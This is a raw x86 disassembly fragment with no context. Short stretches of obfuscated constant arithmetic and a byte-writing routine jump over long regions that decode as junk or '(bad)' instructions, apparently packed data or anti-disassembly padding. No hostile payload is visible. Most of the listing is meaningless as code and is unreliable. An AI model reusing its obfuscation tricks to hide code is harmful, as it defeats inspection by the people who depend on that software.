  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0x52
  416d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d7f:	jnp    0x416d31
  416d81:	jp     0x416d77
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    cl,bl
  416d8a:	daa    
  416d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d8c:	das    
  416d8d:	mov    cl,0xdf
  416d8f:	outs   dx,DWORD PTR ds:[esi]
  416d90:	sahf   
  416d91:	inc    edx
  416d92:	scas   eax,DWORD PTR es:[edi]
  416d93:	mov    ch,0x1
  416d95:	inc    edx
  416d96:	adc    eax,0x73e2e8d9
  416d9b:	mov    BYTE PTR [ebp+0x1],al
  416d9e:	popf   
  416d9f:	test   eax,0x98e15a1f
  416da4:	nop
  416da5:	clc    
  416da6:	inc    esp
  416da7:	sub    ebp,DWORD PTR [ecx]
  416da9:	xlat   BYTE PTR ds:[ebx]
  416daa:	test   DWORD PTR [ecx+0x6232a3f9],edi
  416db0:	inc    esi
  416db1:	add    BYTE PTR [edx-0x231c43e5],dl
  416db7:	mov    ch,0xf8
  416db9:	fsub   st(1),st
  416dbb:	and    edx,edx
  416dbd:	mov    ch,0xfe
  416dbf:	add    cl,dh
  416dc1:	xor    al,0x28
  416dc3:	jmp    0x416d6c
  416dc5:	mov    eax,ds:0x9df2bad3
  416dca:	inc    ecx
  416dcb:	and    al,0x6
  416dcd:	cdq    
  416dce:	xchg   edi,eax
  416dcf:	(bad)  
  416dd0:	les    edi,FWORD PTR [eax]
  416dd2:	mov    DWORD PTR [edx-0x55],esp
  416dd5:	pop    esi
  416dd6:	pop    ebp
  416dd7:	int3   
  416dd8:	mov    eax,ds:0x23d1388a
  416ddd:	(bad)  
  416dde:	mov    ecx,0xad4c32ec
  416de3:	out    0xd9,al
  416de5:	sbb    edi,DWORD PTR [edi-0xac03239]
  416deb:	mov    ecx,0xf5089159
  416df0:	adc    DWORD PTR [ecx+0x2895e63],esi
  416df6:	mov    dh,0x56
  416df8:	je     0x416e0c
  416dfa:	sbb    dh,dl
  416dfc:	adc    ah,BYTE PTR [ecx+0xdc16385]
  416e02:	neg    DWORD PTR ds:0x4476190f
  416e08:	out    0x87,eax
  416e0a:	pop    esi
  416e0b:	cdq    
  416e0c:	fs mov edi,0xf92654b
  416e12:	and    BYTE PTR [edi+0x6ac763da],bh
  416e18:	test   bh,0x66
  416e1b:	inc    esi
  416e1c:	fisubr DWORD PTR [edx]
  416e1e:	adc    edi,ecx
  416e20:	aam    0x2d
  416e22:	xchg   DWORD PTR [edi],edx
  416e24:	inc    edi
  416e25:	btc    ebx,0x2c
  416e29:	aad    0x81
  416e2b:	jg     0x416e16
  416e2d:	xchg   esp,eax
  416e2e:	sar    edi,1
  416e30:	scas   eax,DWORD PTR es:[edi]
  416e31:	and    bl,cl
  416e33:	cmc    
  416e34:	sub    DWORD PTR [ebx+0x13a30ffd],0x43
  416e3b:	fdivr  st(7),st
  416e3d:	int3   
  416e3e:	mov    esi,0x86cf4172
  416e43:	ret    
  416e44:	push   esp
  416e45:	jg     0x416e7e
  416e47:	ins    BYTE PTR es:[edi],dx
  416e48:	inc    esp
  416e49:	fimul  DWORD PTR [eax+0x2d5cb27a]
  416e4f:	xchg   DWORD PTR [ecx-0x1ca41bd5],edx
  416e55:	cmp    eax,DWORD PTR ds:0x129cc849
  416e5b:	popf   
  416e5c:	add    DWORD PTR [ebx],ebx
  416e5e:	push   ecx
  416e5f:	xchg   edi,eax
  416e60:	jge    0x416de9
  416e62:	xchg   edi,eax
  416e63:	mov    al,ds:0x616c60df
  416e68:	push   esi
  416e69:	pop    ds
  416e6a:	push   eax
  416e6b:	or     dh,BYTE PTR [ecx]
  416e6d:	sbb    cl,BYTE PTR [ecx-0x7dabf2bf]
  416e73:	sbb    al,0x37
  416e75:	xor    esi,DWORD PTR [ecx+0x3bfb87d7]
  416e7b:	neg    al
  416e7d:	in     eax,0x13
  416e7f:	and    BYTE PTR [ebx-0x60],ah
  416e82:	push   ds
  416e83:	xchg   edx,eax
  416e84:	sub    al,ah
  416e86:	or     eax,0x9a7c670b
  416e8b:	popf   
  416e8c:	cmc    
  416e8d:	add    DWORD PTR [edi+0x26],eax
  416e90:	dec    ebx
  416e91:	dec    ebx
  416e92:	aad    0xc9
  416e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e95:	push   ecx
  416e96:	pop    ss
  416e97:	xor    eax,0x6fccd27d
  416e9c:	adc    eax,edi
  416e9e:	push   0xffffff8d
  416ea0:	add    eax,0xec2065c
  416ea5:	out    dx,al
  416ea6:	les    ebp,FWORD PTR [esi]
  416ea8:	or     al,0x3f
  416eaa:	cli    
  416eab:	cmp    dh,BYTE PTR [edx+edx*4+0x4f]
  416eaf:	and    esi,esp
  416eb1:	push   ecx
  416eb2:	and    eax,0xb606e4ab
  416eb7:	imul   ecx,DWORD PTR [esi],0x52928dd9
  416ebd:	sub    DWORD PTR [esi],esp
  416ebf:	pop    esi
  416ec0:	add    BYTE PTR [ecx],bh
  416ec2:	(bad)  
  416ec3:	in     eax,dx
  416ec4:	rol    DWORD PTR es:[eax+0x3a0415b2],cl
  416ecb:	ja     0x416f48
  416ecd:	dec    eax
  416ece:	idiv   edx
  416ed0:	pop    esp
  416ed1:	outs   dx,DWORD PTR ds:[esi]
  416ed2:	pop    ebp
  416ed3:	repz (bad) 
  416ed5:	sub    bh,bh
  416ed7:	fdivr  QWORD PTR [esi+0x37332f11]
  416edd:	stc    
  416ede:	dec    esi
  416edf:	mov    ds:0xd36b4e81,al
  416ee4:	cs xchg ebp,eax
  416ee6:	in     al,0xfc
  416ee8:	fnstsw WORD PTR [edx+0x36]
  416eeb:	cwde   
  416eec:	leave  
  416eed:	mov    esi,0x3ff36ad8
  416ef2:	and    eax,esp
  416ef4:	mov    ds:0x2bf3a56e,al
  416ef9:	sar    BYTE PTR [ebx-0x24aee949],0x50
  416f00:	ret    
  416f01:	out    0xfe,al
  416f03:	loop   0x416f2e
  416f05:	adc    BYTE PTR [ecx+0x78],dh
  416f08:	push   0x5b
  416f0a:	adc    eax,0x677951dc
  416f0f:	and    eax,0x46579e17
  416f14:	loope  0x416f2b
  416f16:	nop
  416f17:	(bad)  
  416f18:	arpl   WORD PTR [esi+0x55],cx
  416f1b:	ins    BYTE PTR es:[edi],dx
  416f1c:	cmp    al,0x1c
  416f1e:	mov    bh,0x3e
  416f20:	adc    ah,al
  416f22:	cwde   
  416f23:	ins    BYTE PTR es:[edi],dx
  416f24:	inc    esp
  416f25:	pop    ds
  416f26:	(bad)  
  416f28:	arpl   WORD PTR [ecx-0x2be6a122],ax
  416f2e:	adc    bh,bh
  416f30:	add    DWORD PTR [esi],edi
  416f32:	push   esp
  416f33:	xor    ch,BYTE PTR [esi-0x6f]
  416f36:	mov    ah,0xb2
  416f38:	stc    
  416f39:	les    edi,FWORD PTR [esi-0x3f04cff]
  416f3f:	mov    edi,0xeb363a68
  416f44:	or     ax,0x53b2
  416f48:	cli    
  416f49:	mov    ebx,esi
  416f4b:	loop   0x416fc9
  416f4d:	in     al,0x94
  416f4f:	push   edx
  416f50:	lods   al,BYTE PTR ds:[esi]
  416f51:	adc    edx,DWORD PTR [ebp+0x4f]
  416f54:	enter  0x501c,0xcd
  416f58:	leave  
  416f59:	mov    al,0x58
  416f5b:	jnp    0x416fcb
  416f5d:	adc    dh,BYTE PTR [edx]
  416f5f:	out    dx,al
  416f60:	mov    edx,0x37339b40
  416f65:	jo     0x416f58
  416f67:	je     0x416fc0
  416f69:	call   0x6005f81c
  416f6e:	daa    
  416f6f:	jnp    0x416f63
  416f71:	and    eax,0xf1459d8
  416f76:	push   0xffffffcb
  416f78:	fs mov dh,0x2b
  416f7b:	lods   al,BYTE PTR ds:[esi]
  416f7c:	push   0x563087a6
  416f81:	adc    cl,bh
  416f83:	out    0xae,al
  416f85:	cli    
  416f86:	push   esi
  416f87:	arpl   WORD PTR [edx],bx
  416f89:	pop    ebx
  416f8a:	inc    eax
  416f8b:	mov    eax,ds:0xe8423d48
  416f90:	cmp    ebp,DWORD PTR [eax]
  416f92:	mov    ebp,0x57fecbd5
  416f97:	pop    edx
  416f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f99:	jne    0x416ff0
  416f9b:	add    DWORD PTR [ebx+0x4f],esi
  416f9e:	xchg   edx,eax
  416f9f:	jb     0x41701e
  416fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fa2:	pop    edi
  416fa3:	sbb    eax,0x283aa9f0
  416fa8:	les    eax,FWORD PTR [ebx+0x76]
  416fab:	add    DWORD PTR [edi+edx*1],esp
  416fae:	push   0x8f3ae43d
  416fb3:	mov    esi,0x68cec3a8
  416fb8:	nop
  416fb9:	idiv   BYTE PTR [edi+0x5]
  416fbc:	hlt    
  416fbd:	cmp    al,0xbc
  416fbf:	add    BYTE PTR [esi+0x6a350e1d],dh
  416fc5:	adc    edx,DWORD PTR [ebp+0x6d]
  416fc8:	sahf   
  416fc9:	ret    
  416fca:	das    
  416fcb:	inc    edx
  416fcc:	popf   
  416fcd:	lock in al,dx
  416fcf:	fnstsw WORD PTR [ebx]
  416fd1:	adc    ecx,DWORD PTR [esp+ebx*2]
  416fd4:	stos   BYTE PTR es:[edi],al
  416fd5:	and    al,0x28
  416fd7:	sbb    eax,0x16322d64
  416fdc:	dec    esp
  416fdd:	xor    al,BYTE PTR [esp+edx*8+0x53]
  416fe1:	mul    esp
  416fe3:	mov    ebp,0x8ec0bb2
  416fe8:	sub    DWORD PTR ds:[ebp+0x42],esi
  416fec:	mov    esi,0xbeceab1f
  416ff1:	clc    
  416ff2:	leave  
  416ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff4:	fld    TBYTE PTR [edx-0x58f7835d]
  416ffa:	popf   
  416ffb:	cmp    BYTE PTR [eax-0x67],ah
  416ffe:	fmul   QWORD PTR [ebp-0x17efc6da]
  417004:	jbe    0x41703d
  417006:	xchg   esi,eax
  417007:	mov    BYTE PTR [edi],ch
  417009:	call   0x5354:0xc6f819c2
  417010:	call   0x516deda4
  417015:	dec    edx
  417016:	ret    0x7b3f
  417019:	cwde   
  41701a:	icebp  
  41701b:	inc    ebp
  41701c:	cli    
  41701d:	push   0xf4d0d445
  417022:	cld    
  417023:	scas   al,BYTE PTR es:[edi]
  417024:	cmp    DWORD PTR [ecx-0xf],esi
  417027:	mov    ds:0x4f729f72,al
  41702c:	imul   esp,DWORD PTR [ecx],0x45
  41702f:	xchg   esp,eax
  417030:	push   ebx
  417031:	xor    DWORD PTR [ecx+0x77],edi
  417034:	xor    DWORD PTR [edx-0x4c246edc],edi
  41703a:	dec    eax
  41703b:	fistp  WORD PTR [eax]
  41703d:	adc    eax,DWORD PTR [ebp-0x1b]
  417040:	sbb    ebx,eax
  417042:	add    eax,0xb2ca41f0
  417047:	retf   0xa299
  41704a:	ret    
  41704b:	cld    
  41704c:	pop    esp
  41704d:	fnclex 
  41704f:	call   0xe93a5e41
  417054:	sub    bh,dl
  417056:	jno    0x4170bf
  417058:	xor    eax,0xe9f73ca7
  41705d:	pop    ds
  41705e:	inc    ebp
  41705f:	add    DWORD PTR [esi+0x16035a75],eax
  417065:	(bad)  
  417066:	or     al,BYTE PTR [ecx+0x66501885]
  41706c:	cmp    ecx,esp
  41706e:	aaa    
  41706f:	ret    0x724e
  417072:	pop    eax
  417073:	mov    eax,0xcd782f8f
  417078:	pushf  
  417079:	and    eax,0xa592e371
  41707e:	jae    0x4170ec
  417080:	in     eax,0x68
  417082:	imul   DWORD PTR [eax-0x47]
  417085:	jbe    0x4170a8
  417087:	dec    edx
  417088:	sbb    BYTE PTR [edi-0xd],cl
  41708b:	loope  0x41709d
  41708d:	jecxz  0x417060
  41708f:	jmp    0x4170d1
  417091:	xor    edx,esp
  417093:	jb     0x4170be
  417095:	dec    ebp
  417096:	ins    BYTE PTR es:[edi],dx
  417097:	pop    ds
  417098:	fwait
  417099:	(bad)  
  41709a:	pop    ds
  41709b:	fwait
  41709c:	daa    
  41709d:	in     al,0x71
  41709f:	dec    ebx
  4170a0:	xchg   esp,eax
  4170a1:	leave  
  4170a2:	pushf  
  4170a3:	ins    BYTE PTR es:[edi],dx
  4170a4:	sahf   
  4170a5:	sub    edx,DWORD PTR [ebx-0x48]
  4170a8:	jecxz  0x417035
  4170aa:	inc    ebp
  4170ab:	lock mov ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xb07df0ff
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    al,ch
  41719f:	sbb    BYTE PTR [ebp+0x4d68e82f],0x19
  4171a6:	pushf  
  4171a7:	jo     0x4171cc
  4171a9:	jbe    0x4171be
  4171ab:	imul   esi,DWORD PTR [edi+0x7d],0xe8536de9
  4171b2:	(bad)  
  4171b3:	(bad)  
  4171b4:	jecxz  0x417141
  4171b6:	mov    al,ds:0xf555d051
  4171bb:	mov    bl,dh
  4171bd:	sbb    al,0xf5
  4171bf:	loope  0x4171e2
  4171c1:	scas   eax,DWORD PTR es:[edi]
  4171c2:	mov    esp,0x32ed87a0
  4171c7:	cmp    al,0xb9
  4171c9:	loop   0x4171bf
  4171cb:	call   0x1583:0x1ea3538a
  4171d2:	cmp    BYTE PTR [ebx-0x54],dh
  4171d5:	nop
  4171d6:	xor    dl,dh
  4171d8:	xchg   esi,eax
  4171d9:	(bad)  
  4171da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171db:	fmul   QWORD PTR [ecx+0x10]
  4171de:	mov    ebx,0x53be0425
  4171e3:	into   
  4171e4:	test   ch,bl
  4171e6:	stc    
  4171e7:	popa   
  4171e8:	dec    ecx
  4171e9:	mov    al,BYTE PTR [eax-0x36af8a13]
  4171ef:	adc    dl,BYTE PTR [eax-0x73]
  4171f2:	jecxz  0x4171d1
  4171f4:	hlt    
  4171f5:	aas    
  4171f6:	popa   
  4171f7:	jnp    0x41719d
  4171f9:	and    esi,esi
  4171fb:	std    
  4171fc:	daa    
  4171fd:	shr    BYTE PTR [ebp-0x2b1beeff],cl
  417203:	jmp    0x2548fe93
  417208:	push   eax
  417209:	jg     0x4171b1
  41720b:	enter  0x63dd,0x74
  41720f:	sbb    BYTE PTR [ebx+0x2a],0xb7
  417213:	sub    al,0x1a
  417215:	cmp    esp,edi
  417217:	lahf   
  417218:	fsub   DWORD PTR ds:0xd0c02d12
  41721e:	or     dh,BYTE PTR [edi+0x273f0c62]
  417224:	mov    esp,0x480de5b2
  417229:	loope  0x417274
  41722b:	mov    ds:0x87de9e21,al
  417230:	sbb    al,0xdf
  417232:	xchg   BYTE PTR [esi+eax*1],bh
  417235:	pop    ss
  417236:	dec    eax
  417237:	loope  0x41725f
  417239:	in     eax,0xed
  41723b:	(bad)  
  41723c:	mov    al,ds:0xe2c4afaa
  417241:	and    ecx,edx
  417243:	pop    eax
  417244:	inc    ecx
  417245:	ror    DWORD PTR [edi],0x1b
  417248:	ficom  DWORD PTR [ecx]
  41724a:	sbb    bl,bl
  41724c:	cmp    ah,BYTE PTR [edi-0x23f1e862]
  417252:	loope  0x4171f9
  417254:	push   edx
  417255:	leave  
  417256:	add    esp,ecx
  417258:	adc    DWORD PTR [ecx+ecx*1],ecx
  41725b:	xchg   esp,eax
  41725c:	pop    ds
  41725d:	aas    
  41725e:	adc    edx,edi
  417260:	dec    eax
  417261:	mov    eax,ds:0x8092819f
  417266:	(bad)  
  417268:	leave  
  417269:	mov    DWORD PTR [eax-0x42],edi
  41726c:	xchg   ecx,eax
  41726d:	jnp    0x417291
  41726f:	jp     0x417233
  417271:	or     dl,dl
  417273:	fmul   QWORD PTR [eax+edi*1-0x7e]
  417277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417278:	mov    bh,0xa5
  41727a:	popf   
  41727b:	arpl   WORD PTR [esi-0x66],cx
  41727e:	or     edx,edx
  417280:	push   edi
  417281:	imul   ebx,DWORD PTR [eax+eiz*2-0x19],0xffffff81
  417286:	jle    0x4172e2
  417288:	cmc    
  417289:	and    DWORD PTR [ebx+0x33b6e535],esi
  41728f:	xchg   edi,eax
  417290:	inc    esp
  417291:	test   DWORD PTR [edi-0x266ea97b],edi
  417297:	push   0xeb00b0f6
  41729c:	mov    ds:0x4984c977,al
  4172a1:	lea    eax,[edx-0x4d]
  4172a4:	mov    ecx,0x32e9850e
  4172a9:	pop    ecx
  4172aa:	(bad)  
  4172ab:	nop
  4172ac:	mov    ecx,DWORD PTR [esi]
  4172ae:	ret    0x881b
  4172b1:	sub    eax,0x7de01955
  4172b6:	outs   dx,BYTE PTR ds:[esi]
  4172b7:	or     eax,0x5c15a7dc
  4172bc:	jmp    0xbec430b5
  4172c1:	popf   
  4172c2:	mov    WORD PTR [edx-0x15],?
  4172c5:	loopne 0x417262
  4172c7:	inc    esp
  4172c8:	xchg   bh,dl
  4172ca:	jmp    0x417263
  4172cc:	mul    edi
  4172ce:	mov    eax,ds:0x5611190b
  4172d3:	out    0x6,al
  4172d5:	ret    
  4172d6:	pop    esi
  4172d7:	jge    0x417268
  4172d9:	stos   DWORD PTR es:[edi],eax
  4172da:	push   edx
  4172db:	fbstp  TBYTE PTR [ecx-0x12ad9cb1]
  4172e1:	jns    0x4172ce
  4172e3:	aad    0x59
  4172e5:	sub    dl,0xf4
  4172e8:	inc    edx
  4172e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ea:	pushf  
  4172eb:	dec    ecx
  4172ec:	popf   
  4172ed:	sahf   
  4172ee:	(bad)  
  4172f0:	inc    ebx
  4172f1:	loopne 0x4172d5
  4172f3:	pop    eax
  4172f4:	inc    esp
  4172f5:	fisub  DWORD PTR [ebx+0x22b6865]
  4172fb:	clc    
  4172fc:	cld    
  4172fd:	popa   
  4172fe:	xor    BYTE PTR [ebx],0x92
  417301:	sti    
  417302:	mov    bl,0x19
  417304:	test   BYTE PTR [ebx],cl
  417306:	mov    ds:0xcf341ea3,eax
  41730b:	xchg   ebx,eax
  41730c:	jb     0x4172d2
  41730e:	mov    esi,0x240e9cdd
  417313:	push   ss
  417314:	jmp    0x3a:0x26b915a7
  41731b:	ret    0x519d
  41731e:	jb     0x4172b5
  417320:	xchg   ebp,eax
  417321:	jnp    0x41731c
  417323:	jae    0x41731a
  417325:	jnp    0x417349
  417327:	pop    edx
  417328:	xchg   edi,eax
  417329:	adc    eax,eax
  41732b:	and    eax,0x2eaa6536
  417330:	push   ds
  417331:	mov    ds:0x9faf0837,eax
  417336:	js     0x4173a4
  417338:	rcl    DWORD PTR [ebp+ebp*4-0x375a9d60],0x74
  417340:	dec    ebp
  417341:	lock dec ecx
  417343:	in     al,dx
  417344:	int3   
  417345:	mov    BYTE PTR [edi-0x16],bh
  417348:	xchg   ebp,eax
  417349:	aam    0xde
  41734b:	and    esp,DWORD PTR [esi-0x2c5a12d9]
  417351:	(bad)  
  417352:	pop    ebp
  417353:	push   ecx
  417354:	retf   
  417355:	xchg   ebx,eax
  417356:	lods   eax,DWORD PTR ds:[esi]
  417357:	ret    
  417358:	fs pop esi
  41735a:	mov    al,ds:0x341ef10f
  41735f:	inc    esi
  417360:	and    cl,al
  417362:	call   0x438e:0xda436a89
  417369:	std    
  41736a:	sbb    esp,esp
  41736c:	les    ebx,FWORD PTR [edx+0x5c]
  41736f:	sbb    al,0x5f
  417371:	arpl   WORD PTR [eax],ax
  417373:	pop    es
  417374:	loope  0x4172fe
  417376:	push   edx
  417377:	into   
  417378:	cmp    al,0x68
  41737a:	sub    DWORD PTR [ebx-0x6b29ede2],ecx
  417380:	daa    
  417381:	inc    ebx
  417382:	sub    al,0x37
  417384:	xor    bh,BYTE PTR [ecx-0x1d]
  417387:	jp     0x417326
  417389:	jns    0x4173fd
  41738b:	pop    ebp
  41738c:	pusha  
  41738d:	adc    dl,al
  41738f:	or     BYTE PTR [esi],dh
  417391:	or     al,0x7a
  417393:	cmc    
  417394:	push   edi
  417395:	adc    DWORD PTR [edx],ecx
  417397:	push   esi
  417398:	sbb    cl,cl
  41739a:	sahf   
  41739b:	mov    cl,0xd4
  41739d:	arpl   WORD PTR [ebp+0x5a],sp
  4173a0:	and    ah,BYTE PTR [ebp-0x3ac7da2]
  4173a6:	mov    ebx,0x563f88da
  4173ab:	vpmulhuw ymm5,ymm6,YMMWORD PTR [ebp-0x63]
  4173b0:	cld    
  4173b1:	repnz scas al,BYTE PTR es:[edi]
  4173b3:	cmp    DWORD PTR ds:0xbf26798b,edx
  4173b9:	xchg   ebx,eax
  4173ba:	cmp    BYTE PTR [ebx-0x7126039a],0x27
  4173c1:	push   ds
  4173c2:	outs   dx,BYTE PTR ds:[esi]
  4173c3:	dec    ecx
  4173c4:	push   ebp
  4173c5:	clc    
  4173c6:	sub    BYTE PTR [edi+eiz*2-0x14],ah
  4173ca:	pop    eax
  4173cb:	stc    
  4173cc:	leave  
  4173cd:	adc    al,0x93
  4173cf:	add    DWORD PTR [esi],0x6520c285
  4173d5:	sub    edi,DWORD PTR [edx+0x50]
  4173d8:	das    
  4173d9:	mov    ds:0xc0498e3d,eax
  4173de:	mov    ecx,0x19d7aee3
  4173e3:	push   ebx
  4173e4:	neg    BYTE PTR [edi]
  4173e6:	arpl   WORD PTR [esi],cx
  4173e8:	cmc    
  4173e9:	out    0x95,al
  4173eb:	call   0x82418545
  4173f0:	nop
  4173f1:	jnp    0x417405
  4173f3:	shr    DWORD PTR [edx],cl
  4173f5:	xchg   dh,ah
  4173f7:	mov    ds:0xb7c6170a,eax
  4173fc:	mov    ch,BYTE PTR gs:[eax-0x72]
  417400:	mov    dl,dl
  417402:	or     eax,0x15fa904f
  417407:	add    esi,DWORD PTR [ebx]
  417409:	shr    ecx,0xce
  41740c:	sahf   
  41740d:	outs   dx,DWORD PTR ds:[esi]
  41740e:	addr16 in al,0x71
  417411:	rcr    BYTE PTR [edi-0x7aabb9f7],0xec
  417418:	mov    ah,0x6c
  41741a:	push   0xffffffdd
  41741c:	push   edi
  41741d:	lods   al,BYTE PTR ds:[esi]
  41741e:	pop    es
  41741f:	test   DWORD PTR [esi],edi
  417421:	or     al,0xbd
  417423:	imul   edi,DWORD PTR [esi-0x63ef5aa4],0x9f19fad1
  41742d:	add    al,dl
  41742f:	push   edx
  417430:	cld    
  417431:	repz sub BYTE PTR [edi-0x22628be8],dh
  417438:	cdq    
  417439:	and    ch,BYTE PTR [ebp+0x5ae91637]
  41743f:	push   ebp
  417440:	dec    ecx
  417441:	dec    esp
  417442:	scas   al,BYTE PTR es:[edi]
  417443:	inc    esi
  417444:	jl     0x417473
  417446:	in     eax,0x43
  417448:	adc    BYTE PTR [esi-0x372bc31],bl
  41744e:	sbb    ah,BYTE PTR [edi]
  417450:	mov    ebx,0xde097d0b
  417455:	(bad)  
  417457:	jmp    0x3a31:0x654e9035
  41745e:	cwde   
  41745f:	push   esp
  417460:	adc    eax,0x645749bb
  417465:	push   0xffffff97
  417467:	loopne 0x4174e8
  417469:	in     al,dx
  41746a:	cwde   
  41746b:	push   ebp
  41746c:	mov    dh,0x80
  41746e:	ins    BYTE PTR es:[edi],dx
  41746f:	out    0x34,eax
  417471:	xchg   esi,eax
  417472:	sub    ch,bh
  417474:	(bad)  
  417475:	(bad)  
  417476:	adc    BYTE PTR [ecx],bh
  417478:	adc    bh,BYTE PTR [esi-0x28]
  41747b:	cmp    ebp,DWORD PTR [edx]
  41747d:	push   ecx
  41747e:	cdq    
  41747f:	pushf  
  417480:	ror    dl,cl
  417482:	das    
  417483:	push   ebp
  417484:	into   
  417485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417486:	out    dx,eax
  417487:	(bad)  
  417488:	in     eax,dx
  417489:	and    eax,0xcbb82df3
  41748e:	inc    eax
  41748f:	mov    dl,bh
  417491:	sahf   
  417492:	js     0x417433
  417494:	mov    al,0x8
  417496:	fsub   QWORD PTR [ecx+0x36d6cdb6]
  41749c:	sbb    ah,al
  41749e:	aad    0x18
  4174a0:	cmp    bh,BYTE PTR [ecx]
  4174a2:	stc    
  4174a3:	shr    DWORD PTR [ebx],cl
  4174a5:	push   ds
  4174a6:	dec    ecx
  4174a7:	xchg   DWORD PTR [edx+0x748ef3b2],ecx
  4174ad:	pop    ds
